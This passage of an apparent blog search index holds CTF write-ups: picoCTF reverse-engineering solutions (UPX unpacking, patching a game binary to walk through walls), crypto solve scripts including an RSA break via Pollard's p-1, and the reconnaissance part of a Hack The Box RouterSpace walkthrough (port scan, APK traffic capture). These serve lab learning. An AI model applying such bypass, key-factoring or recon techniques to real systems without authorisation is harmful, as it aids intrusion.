&#39;/opt/cfr/cfr_0_115.jar&#39;dec = subprocess.run([&#39;java&#39;,&#39;-jar&#39;,cfrjar,&#39;./KeygenMe.class&#39;], capture_output=True).stdout.decode()chars = re.compile(&quot;\\&#39;([\\w{}])\\&#39;&quot;).findall(dec)flag = &#39;&#39;for c in chars[::-1]: flag += cprint(flag)UnpackmeChallengeCan you get the flag?Reverse engineer this binary.We are given a UPX binarySolution Unpack the binary $ upx -d unpackme-upx Load the binary into gdb $ gdb-peda -q ./unpackme-upx Disassemble the ‘main’ function gdb-peda$ disass mainDump of assembler code for function main: 0x0000000000401e73 &amp;lt;+0&amp;gt;: endbr64 0x0000000000401e77 &amp;lt;+4&amp;gt;: push rbp 0x0000000000401e78 &amp;lt;+5&amp;gt;: mov rbp,rsp [...] 0x0000000000401ec6 &amp;lt;+83&amp;gt;: mov WORD PTR [rbp-0x14],0x4e 0x0000000000401ecc &amp;lt;+89&amp;gt;: lea rdi,[rip+0xb1131] 0x0000000000401ed3 &amp;lt;+96&amp;gt;: mov eax,0x0 0x0000000000401ed8 &amp;lt;+101&amp;gt;: call 0x410df0 &amp;lt;printf&amp;gt; # &amp;lt;--- First display (What&#39;s my favorite number) 0x0000000000401edd &amp;lt;+106&amp;gt;: lea rax,[rbp-0x3c] 0x0000000000401ee1 &amp;lt;+110&amp;gt;: mov rsi,rax 0x0000000000401ee4 &amp;lt;+113&amp;gt;: lea rdi,[rip+0xb1135] 0x0000000000401eeb &amp;lt;+120&amp;gt;: mov eax,0x0 0x0000000000401ef0 &amp;lt;+125&amp;gt;: call 0x410f80 &amp;lt;__isoc99_scanf&amp;gt; # &amp;lt;--- User input 0x0000000000401ef5 &amp;lt;+130&amp;gt;: mov eax,DWORD PTR [rbp-0x3c] 0x0000000000401ef8 &amp;lt;+133&amp;gt;: cmp eax,0xb83cb # &amp;lt;--- Number validation 0x0000000000401efd &amp;lt;+138&amp;gt;: jne 0x401f42 &amp;lt;main+207&amp;gt; 0x0000000000401eff &amp;lt;+140&amp;gt;: lea rax,[rbp-0x30] 0x0000000000401f03 &amp;lt;+144&amp;gt;: mov rsi,rax [...] 0x0000000000401f53 &amp;lt;+224&amp;gt;: mov rcx,QWORD PTR [rbp-0x8] 0x0000000000401f57 &amp;lt;+228&amp;gt;: xor rcx,QWORD PTR fs:0x28 0x0000000000401f60 &amp;lt;+237&amp;gt;: je 0x401f67 &amp;lt;main+244&amp;gt; 0x0000000000401f62 &amp;lt;+239&amp;gt;: call 0x45cdf0 &amp;lt;__stack_chk_fail_local&amp;gt; 0x0000000000401f67 &amp;lt;+244&amp;gt;: leave 0x0000000000401f68 &amp;lt;+245&amp;gt;: ret End of assembler dump. Decode number gdb-peda$ python print(0xb83cb)754635 Run and win gdb-peda$ runStarting program: unpackme-upx What&#39;s my favorite number? 754635picoCTF{up&amp;gt;&amp;lt;_m3_f7w_ed7b0850} WizardlikeChallengeDo you seek your destiny in these deplorable dungeons?If so, you may want to look elsewhere. Many have gone before you and honestly,they&#39;ve cleared out the place of all monsters, ne&#39;erdowells, banditsand every other sort of evil foe. The dungeons themselves have seen betterdays too. There&#39;s a lot of missing floors and key passages blocked off.You&#39;d have to be a real wizard to make any progress in this sorry excuse for a dungeon!Download the game.&#39;w&#39;, &#39;a&#39;, &#39;s&#39;, &#39;d&#39; moves your character and &#39;Q&#39; quits.You&#39;ll need to improvise some wizardly abilities to find the flag in this dungeon crawl.&#39;.&#39; is floor, &#39;#&#39; are walls, &#39;&amp;lt;&#39; are stairs up to previous level, and &#39;&amp;gt;&#39; are stairs down to next level.This is a console game where we can move with ‘wasd’We can’t go through wall obviously and we can move between levels with the doors ‘&amp;gt;’ ‘&amp;lt;’As we move through the levels, walls and floors are appearing and some are at places we can’t go because of the walls.Level Examples Start of level 1 ####.@.....##.......##........#.......# .# .......# # .......# .......# .......# .......# .......# .......# .......# ....... ......&amp;gt; ####### After Moving all the way south ##########.......# ......# .. ..............#.......# ............#........ .##.......# .##.......# ##.......##.......##.......##.......##.......##.......##.......##.......##.@....&amp;gt;########## After walking everywhere ##########.......# ......# .....................#.......# ............#........ .##.......# .##.......# .##.......# .##.......# .##.......# .#.......##.......##.......##.......##......@##......&amp;gt;########## SolutionFor this one we’ll be using IDA Free to reverse engineer and hack the game Load the binary in IDA Free. Launch IDA from the command line to be able to interact with the process cat | /opt/idafree-7.7/ida64 Decompile the main function by pressing F5 after selecting the functionAt the very end of the function, we can see the functions that’s responsible for the keypress action for w,a,s,d,QIn every one of those functions, we can see that the first thing it does is to get a result from another function.Let’s look into itPseudo-code:Assembly:15AC sub_15AC proc near15AC var_8 = dword ptr -815AC var_4 = dword ptr -415AC endbr6415B0 push rbp15B1 mov rbp, rsp15B4 mov [rbp+var_4], edi15B7 mov [rbp+var_8], esi15BA cmp [rbp+var_4], 63h &amp;lt;---- check if position is in range15BE jg loc_1664 &amp;lt;---- jump to 1664 if not15C4 cmp [rbp+var_8], 63h &amp;lt;---- check if position is in range15C8 jg loc_1664 &amp;lt;---- jump to 1664 if not15CE cmp [rbp+var_4], 0 &amp;lt;---- check if position is in range15D2 js loc_1664 &amp;lt;---- jump to 1664 if not15D8 cmp [rbp+var_8], 0 &amp;lt;---- check if position is in range15DC js loc_1664 &amp;lt;---- jump to 1664 if not15E2 mov eax, [rbp+var_4]15E5 movsxd rcx, eax15E8 mov eax, [rbp+var_8]15EB movsxd rdx, eax15EE mov rax, rdx15F1 shl rax, 215F5 add rax, rdx15F8 lea rdx, ds:0[rax*4]1600 add rax, rdx1603 shl rax, 21607 lea rdx, [rax+rcx]160B lea rax, byte_1FEA01612 add rax, rdx1615 movzx eax, byte ptr [rax]1618 cmp al, 23h ; &#39;#&#39; &amp;lt;---- check if position is a wall161A jz short loc_1656 &amp;lt;---- jump to 1656 if it is161C mov eax, [rbp+var_4]161F movsxd rcx, eax1622 mov eax, [rbp+var_8]1625 movsxd rdx, eax1628 mov rax, rdx162B shl rax, 2162F add rax, rdx1632 lea rdx, ds:0[rax*4]163A add rax, rdx163D shl rax, 21641 lea rdx, [rax+rcx]1645 lea rax, byte_1FEA0164C add rax, rdx164F movzx eax, byte ptr [rax]1652 cmp al, 20h ; &#39; &#39;1654 jnz short loc_165D &amp;lt;---- if all if good, jump to 165D16561656 loc_1656:1656 mov eax, 0 &amp;lt;---- set function return to 0165B jmp short loc_1669165D ; ---------------------------------------------------------------------------165D165D loc_165D:165D mov eax, 1 &amp;lt;---- set function return to 11662 jmp short loc_16691664 ; ---------------------------------------------------------------------------16641664 loc_1664:1664 mov eax, 0 &amp;lt;---- set function return to 016691669 loc_1669:1669 pop rbp166A retn &amp;lt;---- return result166A sub_15AC endpWhat it does is to check if the cursor will still be in range (100x100) if moving to the next position and return 0 if not.Then it checks if the next position is a wall and return 0 if it is indeed a wall (#)If the cursor is allowed to move, it returns 1With the graph view, we can see the 3 jump locations and their results:What we want is this function to always return 1. Edit the function assemblyEdit &amp;gt; Patch program &amp;gt; Assemble…We will insert a jump instruction to 165D at the very beginning of the function to skip all the validationsThe hacked function’s assembly now look like this:The pseudocode:And the graph:We should now be able to walk through wall to reveal the flagSave the binary (Edit &amp;gt; Patch program &amp;gt; Apply patches to input file) Run the game and winLevel 1:Level 2:Level 3:Level 4:Level 5:Level 6:Level 7:Level 8:Level 9:Flag: picoCTF{ur_4_w1z4rd_2A05D7A}Thanks for reading &amp;lt;3h3x" }, { "title": "PicoCTF 2022 - Crypto Challenges", "url": "/posts/picoctf-crypto/", "categories": "picoctf", "tags": "crypto, diffie-hellman, rsa", "date": "2022-03-29 00:00:00 -0400", "snippet": "Basic Mod 1ChallengeWe found this weird message being passed around on the servers, we think we have a working decrpytion scheme.Download the message here.Take each number mod 37 and map it to the following character set: 0-25 is the alphabet (uppercase), 26-35 are the decimal digits, and 36 is an underscore.Wrap your decrypted message in the picoCTF flag format (i.e. picoCTF{decrypted_message})message.txt913225712440406272147 23928535327277110296262299323255337150102Solution#!/usr/bin/env pythonflag = &#39;&#39;map = [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;_&#39;]with open(&#39;message.txt&#39;,&#39;rb&#39;) as file: for char in file.readlines(): char = int(char) % 37 flag = flag + map[char]print(flag)Output:R0UND_N_R0UND_ADD17EC2Basic Mod 2ChallengeA new modular challenge!Download the message here.Take each number mod 41 and find the modular inverse for the result. Then map to the following character set: 1-26 are the alphabet, 27-36 are the decimal digits, and 37 is an underscore.Wrap your decrypted message in the picoCTF flag format (i.e. picoCTF{decrypted_message})message.txt10429035631326233735422914629711837322135933832128879214277131190377Solution#!/usr/bin/env pythondef modinv(x,y): for i in range(y): if (x*i)%y==1: return iflag = &#39;&#39;map = [&#39;&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;_&#39;]with open(&#39;message.txt&#39;,&#39;rb&#39;) as file: for char in file.readlines(): char = int(char) char = char % 41 char = modinv(char,41) flag = flag + map[char]print(flag)Output:1NV3R53LY_H4RD_8A05D939Cred StuffChallengeWe found a leak of a blackmarket website&#39;s login credentials. Can you find the password of the user cultiris and successfully decrypt it?Download the leak here.The first user in usernames.txt corresponds to the first password in passwords.txt. The second user corresponds to the second password, and so on.The files provided are a list of username and a list of passwordSolution$ grep -n cultiris usernames.txt378:cultiris$ sed -n &#39;378p&#39; passwords.txtcvpbPGS{P7e1S_54I35_71Z3}Use Cyberchef to decode ROT13 encoded flag: cvpbPGS{P7e1S_54I35_71Z3} = picoCTF{C7r1F_54V35_71M3}Very SmoothChallengeWe are given 2 files: gen.py output.txtgen.py#!/usr/bin/pythonfrom binascii import hexlifyfrom gmpy2 import *import mathimport osimport sysif sys.version_info &amp;lt; (3, 9): math.gcd = gcd math.lcm = lcm_DEBUG = TrueFLAG = open(&#39;flag.txt&#39;).read().strip()FLAG = mpz(hexlify(FLAG.encode()), 16)SEED = mpz(hexlify(os.urandom(32)).decode(), 16)STATE = random_state(SEED)def get_prime(state, bits): return next_prime(mpz_urandomb(state, bits) | (1 &amp;lt;&amp;lt; (bits - 1)))def get_smooth_prime(state, bits, smoothness=16): p = mpz(2) p_factors = [p] while p.bit_length() &amp;lt; bits - 2 * smoothness: factor = get_prime(state, smoothness) p_factors.append(factor) p *= factor bitcnt = (bits - p.bit_length()) // 2 while True: prime1 = get_prime(state, bitcnt) prime2 = get_prime(state, bitcnt) tmpp = p * prime1 * prime2 if tmpp.bit_length() &amp;lt; bits: bitcnt += 1 continue if tmpp.bit_length() &amp;gt; bits: bitcnt -= 1 continue if is_prime(tmpp + 1): p_factors.append(prime1) p_factors.append(prime2) p = tmpp + 1 break p_factors.sort() return (p, p_factors)e = 0x10001while True: p, p_factors = get_smooth_prime(STATE, 1024, 16) if len(p_factors) != len(set(p_factors)): continue # Smoothness should be different or some might encounter issues. q, q_factors = get_smooth_prime(STATE, 1024, 17) if len(q_factors) != len(set(q_factors)): continue factors = p_factors + q_factors if e not in factors: breakif _DEBUG: import sys sys.stderr.write(f&#39;p = {p.digits(16)}\\n\\n&#39;) sys.stderr.write(f&#39;p_factors = [\\n&#39;) for factor in p_factors: sys.stderr.write(f&#39; {factor.digits(16)},\\n&#39;) sys.stderr.write(f&#39;]\\n\\n&#39;) sys.stderr.write(f&#39;q = {q.digits(16)}\\n\\n&#39;) sys.stderr.write(f&#39;q_factors = [\\n&#39;) for factor in q_factors: sys.stderr.write(f&#39; {factor.digits(16)},\\n&#39;) sys.stderr.write(f&#39;]\\n\\n&#39;)n = p * qm = math.lcm(p - 1, q - 1)d = pow(e, -1, m)c = pow(FLAG, e, n)print(f&#39;n = {n.digits(16)}&#39;)print(f&#39;c = {c.digits(16)}&#39;)output.txtn = 6c5f4a08d820579e606aeb3800d1602c53825167d01bd7c87f43041afdc82877c50bbcc7830a0bf8c718fc9016e4a9e73ff0dfe1edd38688acb6add89b2bd6264d61e2ce0c9b3b0813b46b0eb1fcfc56b9f7f072ba2e1e986e6420f8ad9063e10fa9bca464b23fcf0135f95dc11a89bfddf2e81572c196f4362ea551aee18b343638d9d703b234e788bff4ddc3e885da77c7940a0fa670ddc1604646871f0739199fa7fa01f9ed7d84fb9f0cc82965450e7c97153fec84ef8e10a7fceb37a90e847a012528c733070e9ab751215b13a7e2d485089c0c4d00b81dbab382ef7681c717c76c2b14ce6495ef121540653561c3dd519c5f6e2ead18e9d90f3769a029c = 42cbc15285a307d86ac5184c89d6bea5ebdc0a7546debedfe40af69fa6813eaf11ef86543349062587621b845e82817cf7f154c067733ee8b23a75e45861ee0c45a07e702dcb199adffa4ca0892fcd85abfe9e9b59c2ac2df7811a656a3fda16f385972107481409e33e820a19864233b8a35bc49734dc337786dc06c0460a4ec9fc06d16fd66a43654390a526ab0a6239b14427a9868399f6e4863ac04539690357e9a4fa67450286febd9a97dd07864f516f6756c2ffad0b1ba5882980f0089605f0def91120a80a448f77ec272be41de0e11695ba7d0c8899b1d9e8905a1b5e95a755e584dead086f35844052f261e8dcd0d6cffdce38cd5181235dfa0745SolutionThe solution for this challenge is some basic RSA maths.We have n,c (public modulus, ciphertext) from output.txt and e (public exponent) from gen.py. It’s pretty clear that we have to recover plaintext from ciphertext.Steps for solving: Generate public key with n,e Factor n to get p,q Decrypt ciphertext with pt = c ** d % eFor sake of simplicity, I used goRsaTool for the first stepssolve.pyimport subprocessimport refrom Crypto.Util.number import *from gmpy2 import *with open(&#39;output.txt&#39;,&#39;r&#39;) as file: output = file.read()n = mpz(&#39;0x&#39;+re.compile(&#39;n = ([0-9a-f]*)&#39;).search(output).groups()[0])c = mpz(&#39;0x&#39;+re.compile(&#39;c = ([0-9a-f]*)&#39;).search(output).groups()[0])e = 0x10001# Generate public key from n,epubkey = subprocess.run([&#39;goRsaTool&#39;,&#39;-n&#39;,str(n),&#39;-e&#39;,str(e),&#39;-createkey&#39;], capture_output=True)pubkeyfile = open(&#39;pub.key&#39;,&#39;w&#39;)pubkeyfile.write(str(pubkey.stdout.decode()))pubkeyfile.close()# Generate private key using Pollard&#39;s p-1 attackprivkey = subprocess.run([&#39;goRsaTool&#39;,&#39;-key&#39;,&#39;./pub.key&#39;,&#39;-attack&#39;,&#39;pollardsp1&#39;], capture_output=True)privkeyfile = open(&#39;priv.key&#39;,&#39;w&#39;)privkeyfile.write(str(privkey.stdout.decode()))privkeyfile.close()# Extract n,d,p,q,e from private key outputprivparams = subprocess.run([&#39;goRsaTool&#39;,&#39;-key&#39;,&#39;./priv.key&#39;,&#39;-dumpkey&#39;], capture_output=True)priv_n = mpz(re.compile(&#39;n = ([0-9]*)&#39;).search(privparams.stdout.decode()).groups()[0])priv_d = mpz(re.compile(&#39;d = ([0-9]*)&#39;).search(privparams.stdout.decode()).groups()[0])priv_p = mpz(re.compile(&#39;p = ([0-9]*)&#39;).search(privparams.stdout.decode()).groups()[0])priv_q = mpz(re.compile(&#39;q = ([0-9]*)&#39;).search(privparams.stdout.decode()).groups()[0])priv_e = mpz(re.compile(&#39;e = ([0-9]*)&#39;).search(privparams.stdout.decode()).groups()[0])# Check if maths are okassert priv_n == nassert n == priv_p * priv_q# Decrypt c to get the flagpt = pow(c, priv_d, priv_n)print(&quot;Flag: &quot; + str(long_to_bytes(pt)))Thanks for reading &amp;lt;3h3x" }, { "title": "Hack The Box - RouterSpace", "url": "/posts/htb-routerspace/", "categories": "hackthebox", "tags": "linux, android, cve, privilege escalation, rce", "date": "2022-03-08 00:00:00 -0500", "snippet": "Challenge descriptionhttps://app.hackthebox.com/machines/RouterSpaceThis VM is a medium Linux machineReconnaissance / EnumerationPort scanning and service identification$ rustscan -a $ip -r 1-65535 --ulimit 5000 -- -A -sC[...]PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1| ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTJG10LrPb/oV0/FaR2FprNXTVtRobg1Jwy5UOJGrzjWqI8lNDf5DDi3ilSdkJZ0+0Rwr4/gKG5UlyvqCz07XrPfnWG+E7NrgpMpVKR4LF9fbX750gxK+hOSco3qQclv3CUTjTzwMgxf0ltyOg6WJvThYQ3CFDDeOc4T27YqQ/VgwBT92PWu6aZgWX2oAn+X8/fdcejGWeumU9b+rufiNt/pQ1dGUz+wkHeb2pIaA4WfEQLHB1xF33rTZuAXFDiKSb35EpPvhuShsMPQv6Q+NfLAiENgdy+UdybSNH6k1gmPHyroSYoXth7Pelpg+38V9SYtvvoxQRqBbaLApEClTnIM/IvQba9vY8VdfKYDGDcgeuPm8ksnOFPrb5L6axwl0K2ngE4VHQBJM0yxIRo5dELswD1c9O1tR2rq6MbW2giPl6dx/xzEbdVV6VO5n/prjsnpEs8YvNmnELrt6mt0FkcJQ9ageN5ji3pecKxKTVY4J71yf4+cVZKwpX8xI5H6E=| 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDiksdoNGb5HSVU5I64JPbS+qDrMnHaxiFkU+JKFH9VnP69mvgdIM9wTDl/WGjeWV2AJsl7NLQQ4W0goFL/Kz48=| 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2psOHQ+E45S1f8MOulwczO6MLHRMr+DYtiyNM0SJw880/tcp open http syn-ack|_http-title: RouterSpace| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-favicon: Unknown favicon MD5: 4DEC9F02017F347C687806F17B9F0729|_http-trane-info: Problem with XML parsing of /evox/about| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-14884| Content-Type: text/html; charset=utf-8| Content-Length: 71| ETag: W/&quot;47-JvR+cWIPtJTQukQQfRo3wdT96ls&quot;| Date: Tue, 01 Mar 2022 05:21:17 GMT| Connection: close| Suspicious activity detected !!! {RequestID: a5 F aan n z dAf IC }| GetRequest: | HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-2349| Accept-Ranges: bytes| Cache-Control: public, max-age=0| Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT| ETag: W/&quot;652c-17d476c9285&quot;| Content-Type: text/html; charset=UTF-8| Content-Length: 25900| Date: Tue, 01 Mar 2022 05:21:17 GMT| Connection: close| &amp;lt;!doctype html&amp;gt;| &amp;lt;html class=&quot;no-js&quot; lang=&quot;zxx&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt;RouterSpace&amp;lt;/title&amp;gt;| &amp;lt;meta name=&quot;description&quot; content=&quot;&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/owl.carousel.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/magnific-popup.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/themify-icons.css&quot;&amp;gt;| HTTPOptions: | HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-94769| Allow: GET,HEAD,POST| Content-Type: text/html; charset=utf-8| Content-Length: 13| ETag: W/&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;| Date: Tue, 01 Mar 2022 05:21:17 GMT| Connection: close| GET,HEAD,POST| RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request|_ Connection: close2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port22-TCP:V=7.92%I=7%D=3/1%Time=621DAD4F%P=x86_64-pc-linux-gnu%r(NULL,SF:29,&quot;SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n&quot;);==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port80-TCP:V=7.92%I=7%D=3/1%Time=621DAD4F%P=x86_64-pc-linux-gnu%r(GetReSF:quest,31BA,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nXSF:-Cdn:\\x20RouterSpace-2349\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-Control:\\SF:x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\x202021\\SF:x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\&quot;652c-17d476c9285\\&quot;\\r\\nContent-Type:\\SF:x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDate:\\x20SF:Tue,\\x2001\\x20Mar\\x202022\\x2005:21:17\\x20GMT\\r\\nConnection:\\x20close\\r\\SF:n\\r\\n&amp;lt;!doctype\\x20html&amp;gt;\\n&amp;lt;html\\x20class=\\&quot;no-js\\&quot;\\x20lang=\\&quot;zxx\\&quot;&amp;gt;\\n&amp;lt;heSF:ad&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;meta\\x20charset=\\&quot;utf-8\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;metaSF:\\x20http-equiv=\\&quot;x-ua-compatible\\&quot;\\x20content=\\&quot;ie=edge\\&quot;&amp;gt;\\n\\x20\\x20\\x2SF:0\\x20&amp;lt;title&amp;gt;RouterSpace&amp;lt;/title&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;meta\\x20name=\\&quot;descriSF:ption\\&quot;\\x20content=\\&quot;\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;meta\\x20name=\\&quot;viewport\\&quot;\\x2SF:0content=\\&quot;width=device-width,\\x20initial-scale=1\\&quot;&amp;gt;\\n\\n\\x20\\x20\\x20\\x2SF:0&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/bootstrap\\.min\\.css\\&quot;&amp;gt;\\n\\x20SF:\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/owl\\.carousel\\.miSF:n\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20href=\\&quot;css/maSF:gnific-popup\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylesheet\\&quot;\\x20hrSF:ef=\\&quot;css/font-awesome\\.min\\.css\\&quot;&amp;gt;\\n\\x20\\x20\\x20\\x20&amp;lt;link\\x20rel=\\&quot;stylSF:esheet\\&quot;\\x20href=\\&quot;css/themify-icons\\.css\\&quot;&amp;gt;\\n\\x20\\x20&quot;)%r(HTTPOptions,SF:108,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\xSF:20RouterSpace-94769\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20textSF:/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\&quot;d-bMedSF:pZYGrVt1nR4x\\+qdNZ2GqyRo\\&quot;\\r\\nDate:\\x20Tue,\\x2001\\x20Mar\\x202022\\x2005:SF:21:17\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST&quot;)%r(RTSPRequeSF:st,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\rSF:\\n&quot;)%r(X11Probe,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\xSF:20close\\r\\n\\r\\n&quot;)%r(FourOhFourRequest,12D,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nX-SF:Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-14884\\r\\nContent-TySF:pe:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2071\\r\\nETag:\\x2SF:0W/\\&quot;47-JvR\\+cWIPtJTQukQQfRo3wdT96ls\\&quot;\\r\\nDate:\\x20Tue,\\x2001\\x20Mar\\x2SF:02022\\x2005:21:17\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\x20aSF:ctivity\\x20detected\\x20!!!\\x20{RequestID:\\x20a5\\x20\\x20\\x20\\x20F\\x20aanSF:\\x20n\\x20\\x20z\\x20dAf\\x20IC\\x20\\x20}&quot;);Web EnumerationI browsed the site manually and found a link to download a file named RouterSpace.apkI tried numerous tools to try and find something else but I didn’tAPK analysisThe file I downloaded is an Android application package. There must be a simpler way of doing it, but here’s what I did:I fired up a Kali Linux VM and installed Anbox on it. Anbox is a container based Android emulator. I also installed adb, which is a cmdline tool to interact with Android devices.With my VM connected to HTB’s VPN, Anbox device is able to ping the target IP but doesn’t resolve the hostname routerspace.htb. Since the emulated device isn’t rooted, I was unable to edit the hosts file from within the device.What I had to do is unpack the android image file, edit the hosts file and repack the img:$ sudo mv /var/lib/anbox/android.img /tmp/android.img$ unsquashfs /tmp/android.img$ echo &#39;2.2.2.2 routerspace.htb&#39; &amp;gt;&amp;gt; /tmp/squashfs-rootfs/system/etc/hosts$ sudo mksquashfs squashfs-root android.img -b 131072 -comp xz -Xbcj x86$ sudo mv android.img /var/lib/anbox/android.img$ sudo systemctl restart anbox-container-managerNow I can test the communication by launching adb shell and ping the hostname:$ adb shellx86_64:/ $ cat /etc/hosts127.0.0.1 localhost::1 ip6-localhost2.2.2.2 routerspace.htbx86_64:/ $ ping routerspace.htbPING routerspace.htb (2.2.2.2) 56(84) bytes of data.64 bytes from routerspace.htb (2.2.2.2): icmp_seq=1 ttl=61 time=23.2 ms64 bytes from routerspace.htb (2.2.2.2): icmp_seq=2 ttl=61 time=23.2 msNext thing I need to do is install the application, again, by using adb :$ adb install ./RouterSpace.apkNow I can open the newly installed application, click next a couple of times and get to a button to test the connectivity of my router.If I click on the button, it works! The application is able to reach out the target. Now I want to know what happened between those two. In a shell on my VM, I started tcpdump to sniff the ‘anbox0’ interface:$ sudo tcpdump -i anbox0 -A -s0 host 2.2.2.2tcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on anbox0, link-type EN10MB (Ethernet), snapshot length 262144 bytes14:52:06.710365 IP 192.168.250.2.53172 &amp;gt; routerspace.htb.http: Flags [S], seq 3244971510, win 64240, options [mss 1460,sackOK,TS val 2575979077 ecr 0,nop,wscale 7], length 0E..&amp;lt;..@.@..\\.........P.jU..........w...........RE........14:52:06.733103 IP routerspace.htb.http &amp;gt; 192.168.250.2.53172: Flags [S.], seq 44160001, ack 3244971511, win 65535, options [mss 1460], length 0E..,....?..........P.......jU.... .......14:52:06.733157 IP 192.168.250.2.53172 &amp;gt; routerspace.htb.http: Flags [.], ack 1, win 64240, length 0E..(..@.@..o.........P.jU.....P....c..14:52:06.734835 IP 192.168.250.2.53172 &amp;gt; routerspace.htb.http: Flags [P.], seq 1:278, ack 1, win 64240, length 277: HTTP: POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1E..=..@.@..Y.........P.jU.....P....x..POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1accept: application/json, text/plain, */*user-agent: RouterSpaceAgentContent-Type: application/jsonContent-Length: 16Host: routerspace.htbConnection: Keep-AliveAccept-Encoding: gzip{&quot;ip&quot;:&quot;0.0.0.0&quot;}14:52:06.734982 IP routerspace.htb.http &amp;gt; 192.168.250.2.53172: Flags [.], ack 278, win 65535, length 0E..(....?..........P.......jW.P... l..14:52:06.769596 IP routerspace.htb.http &amp;gt; 192.168.250.2.53172: Flags 